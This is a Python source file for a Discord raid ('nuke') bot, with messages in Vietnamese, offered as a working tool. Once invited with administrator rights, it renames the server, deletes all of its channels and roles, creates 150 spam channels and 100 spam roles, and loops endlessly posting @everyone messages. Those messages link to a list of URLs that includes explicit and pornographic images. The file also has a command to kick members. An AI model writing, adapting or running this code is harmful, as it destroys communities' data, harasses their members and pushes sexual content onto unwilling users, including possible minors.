import os
import discord
from discord.ext import commands
from colorama import Fore, Style, init
import asyncio
import random
import aiohttp
import json
import time

os.system('cls' if os.name == 'nt' else 'clear')
init(autoreset=True)
asciiart = Fore.BLUE + r"""
  _   _ _             _  _      _           
 | |_| | |__ ___ _   | \| |_  _| |_____ _ _ 
 | ' \_  _\ V / ' \  | .` | || | / / -_) '_|
 |_||_||_| \_/|_||_| |_|\_|\_,_|_\_\___|_|  
                                            
"""
print(asciiart)
print(Fore.BLUE + "Đang lấy token...")
time.sleep(2)
print(Fore.GREEN + "Đã xác định được token")
import time, sys
states = ["Loading", "Loading.", "Loading..", "Loading... \n"]
t = time.time()

while time.time() - t < 1:
    for s in states:
        if time.time() - t >= 1:
            break
        sys.stdout.write('\r' + Fore.WHITE + s)
        sys.stdout.flush()
        time.sleep(0.3)
def get_token():
    try:
        with open("token.json", "r") as f:
            data = json.load(f)
            return data.get("token")
    except FileNotFoundError:
        print("File token.json chưa được tạo hãy chạy file main.py")
    except json.JSONDecodeError:
        print("Lỗi khi decode JSON")
    return None
token = get_token()
time.sleep(1)
intents = discord.Intents.all()
nuke = False
bot = commands.Bot(command_prefix="%", intents=intents)

links = [
    "https://th.bing.com/th/id/OIP.2qP7Qc6yDq_oCkMZiJwuvQHaMr?cb=iwc2&rs=1&pid=ImgDetMain",
    "https://th.bing.com/th/id/OIP.Z6KHU8gW21DsAoFmthLv2QHaKa?cb=iwc2&rs=1&pid=ImgDetMain",
    "https://th.bing.com/th/id/OIP.rsqzw8E0F-1Syyu3Wcw45AHaHQ?cb=iwc2&rs=1&pid=ImgDetMain",
    "https://cdn.donmai.us/original/6a/f9/6af9740d95bd1ff2193446f6508df9cc.jpg",
    "https://th.bing.com/th/id/OIP.sv43zitXA3HlkYqyeQ7R5QHaJa?cb=iwc2&rs=1&pid=ImgDetMain",
    "https://th.bing.com/th/id/OIP.yy4cdPiuHEFhQHsRwq5FiAHaLt?cb=iwc2&rs=1&pid=ImgDetMain",
    "https://th.bing.com/th/id/OIP.ofNqm68ccWJZIJ55rjmA6QHaHa?cb=iwc2&rs=1&pid=ImgDetMain",
    "https://tse1.explicit.bing.net/th/id/OIP.A_SpEyPBBmesMDcptH_2FQHaGc?cb=iwp2&rs=1&pid=ImgDetMain",
    "https://tse1.explicit.bing.net/th/id/OIP.jJ9Cb9oyWdmZuainmNtcRQHaKl?cb=iwp2&rs=1&pid=ImgDetMain",
    "https://tse1.explicit.bing.net/th/id/OIP.v1qhvi0BlAD_wCUR2ZouRgHaJo?cb=iwp2&rs=1&pid=ImgDetMain",
    "https://us.rule34.xxx/images/6808/363ca74031f9d5bbbc48958d4cef5bf4.png?7771203https://th.bing.com/th/id/R.3d63e05f9ef145cc003a831a8e0e5fcf?rik=eKtEFeJccG0s8g&riu=http%3a%2f%2fpreview.redd.it%2faovn3f0cv15b1.jpg%3fwidth%3d2048%26format%3dpjpg%26auto%3dwebp%26v%3denabled%26s%3d830f760ef4577315e9a0fac37f88ad45d1a29faf&ehk=5brPTaqKSrh4Ftfs%2fg9oTwktzlG7mBerl3vf4GEtX68%3d&risl=&pid=ImgRaw&r=0",
    "https://th.bing.com/th/id/R.3d63e05f9ef145cc003a831a8e0e5fcf?rik=eKtEFeJccG0s8g&riu=http%3a%2f%2fpreview.redd.it%2faovn3f0cv15b1.jpg%3fwidth%3d2048%26format%3dpjpg%26auto%3dwebp%26v%3denabled%26s%3d830f760ef4577315e9a0fac37f88ad45d1a29faf&ehk=5brPTaqKSrh4Ftfs%2fg9oTwktzlG7mBerl3vf4GEtX68%3d&risl=&pid=ImgRaw&r=0",
    "https://tse1.explicit.bing.net/th/id/OIP.Aw5qiDWDV8IMk3pdG1prVQHaJK?cb=iwp2&w=1656&h=2048&rs=1&pid=ImgDetMain",
    "https://image.hdporncomics.com/uploads/Freehope-5-The-Darkest-Day51.jpg",
    "https://th.bing.com/th/id/R.d6935225fd726800f488eab0306f304b?rik=QUmO%2b7hHMqabKA&pid=ImgRaw&r=0"
]
CHANNEL_COUNT = 150
BATCH_SIZE = 20

@bot.event
async def on_ready():
    print(f"[✅] Bot đã đăng nhập: {bot.user} (ID: {bot.user.id}) - Invisible Status")
    await bot.change_presence(status=discord.Status.invisible) 
    print("Hướng dẫn sử dụng:")
    print(f"Link mời bot của bạn: https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot%20applications.commands \nSau đó mời vào server bạn muốn nuke")
    print("Chạy lệnh %nuke để bắt đầu nuke server.")

@bot.command()
async def exit(ctx):
    await ctx.guild.leave()

@bot.command()
async def nuke(ctx):
    global nuke
    if nuke == True:
        ctx.author.send("Already Nuking!")
        return

    if ctx.guild.id == 1349968006649876512:
        return

    nuke = True
    guild = ctx.guild
    url = "https://raw.githubusercontent.com/h43k3rx/internalUI/refs/heads/main/static.png"
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status != 200:
                return await ctx.send("❌ Không thể tải ảnh từ URL.")
            data = await resp.read()
    await ctx.guild.edit(icon=data)
    await ctx.guild.edit(name="<-+-Raid by h4vn ducknovis cb3_mochi-+->")
    print(f"[🧹] Đang xóa toàn bộ kênh theo batch {BATCH_SIZE}...")
    all_channels = guild.channels
    for i in range(0, len(all_channels), BATCH_SIZE):
        batch = all_channels[i:i+BATCH_SIZE]
        tasks = [ch.delete() for ch in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for ch, res in zip(batch, results):
            if isinstance(res, Exception):
                print(f"[x] Không xóa được {ch.name}: {res}")
            else:
                print(f"[DEL] Đã xóa {ch.name}")
        await asyncio.sleep(1)

    await asyncio.sleep(2)
    print(f"[🛠️] Đang tạo {CHANNEL_COUNT} kênh text...")
    created_channels = []
    for i in range(0, CHANNEL_COUNT, BATCH_SIZE):
        batch_tasks = []
        for j in range(15):
            index = i + j
            if index >= CHANNEL_COUNT:
                break
            batch_tasks.append(
                guild.create_text_channel(f"raid-by-h4vn-ducknovis-cb3_mochibéo-{index + 1}")
            )

        results = await asyncio.gather(*batch_tasks, return_exceptions=True)

        for res in results:
            if isinstance(res, discord.TextChannel):
                created_channels.append(res)
                print(f"[+] Đã tạo {res.name}")
            else:
                print(f"[x] Lỗi khi tạo kênh: {res}")
        await asyncio.sleep(0.3)

    print(f"[🚀] Bắt đầu spam vĩnh viễn vào {len(created_channels)} kênh...")

    try:
        while True:
            random_link = random.choice(links)
            MESSAGE_CONTENT = f"@everyone \n **raid by h4vn and cb3_mochi and ducknovis**🤣🤣🤣[.]({random_link})" 
            for i in range(0, len(created_channels), 15):
                batch = created_channels[i:i+BATCH_SIZE]
                tasks = [ch.send(MESSAGE_CONTENT) for ch in batch]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for ch, res in zip(batch, results):
                    if isinstance(res, Exception):
                        print(f"[x] Lỗi gửi #{ch.name}: {res}")
                    else:
                        print(f"[✓] Gửi thành công tại #{ch.name}")
            
            await asyncio.sleep(0.3)
    except Exception as e:
        print(f"[!!!] Lỗi trong spam loop: {e}")

@bot.command()
async def nukerole(ctx):
    global nuke
    if nuke == True:
        ctx.author.send("Already Nuking!")
        return

    if ctx.guild.id == 1349968006649876512:
        return
    prefix = "Raid by h4vn ducknovis cb3_mochi"
    so_luong = 100
    deleted_roles = []
    created_roles = []

    for role in ctx.guild.roles:
        if role.name != "@everyone" and ctx.guild.me.top_role > role:
            try:
                await role.delete()
                deleted_roles.append(role.name)
            except Exception as e:
                print(f"❌ Không thể xóa role {role.name}: {e}")

    for i in range(1, so_luong + 1):
        role_name = f"{prefix}-{i}"
        try:
            role = await ctx.guild.create_role(name=role_name)
            created_roles.append(role_name)
        except Exception as e:
            print(f"❌ Không thể tạo role {role_name}: {e}")

@bot.command()
async def kick(member: discord.Member):
    try:
        await member.kick(reason="Raided by h4vn ducknovis cb3_mochi")
        print(f"[+] Kicked: {member.name}")
    except Exception as e:
        print(f"[!] Failed to kick {member.name}: {e}")


bot.run(token)